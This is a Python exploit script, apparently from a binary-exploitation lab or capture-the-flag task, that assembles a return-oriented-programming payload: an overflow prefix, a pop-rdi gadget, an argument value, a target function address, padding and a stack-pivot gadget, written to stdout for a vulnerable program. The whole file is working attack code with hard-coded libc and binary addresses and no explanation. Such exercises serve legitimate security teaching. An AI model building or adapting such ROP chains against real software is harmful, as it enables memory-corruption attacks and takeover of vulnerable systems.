#!/usr/bin/env python3

import sys

#rop gadget of pop
#0x7ffff7df3cac
pivot= 0x7ffff7df3cac #TODO
# the address of spare_func2 = 0x401214
sf2 = 0x401214 #TODO
#from so.6 pop_rdi = 0x7ffff7df1c65
#from so.2 pop_rdi = 0x7ffff7fccde3
pop_rdi = 0x7ffff7df1c65 #TODO
#the value of rdi
rdi = 3 #TODO

Id = 0x1

oflow = b'1       '

exploit = bytearray(oflow)

buf = b''
buf += pop_rdi.to_bytes(8, byteorder='little')
buf += rdi.to_bytes(8, byteorder='little') 
buf += sf2.to_bytes(8, byteorder='little')

exploit.extend(buf + b'A'*(74 - len(buf)))
exploit.extend(pivot.to_bytes(8, byteorder='little'))
exploit.extend(Id.to_bytes(8, byteorder='little'))
exploit.extend(b'\n')

print("Press enter when ready...", file=sys.stderr)
sys.stdin.buffer.readline()


sys.stdout.buffer.write(exploit)
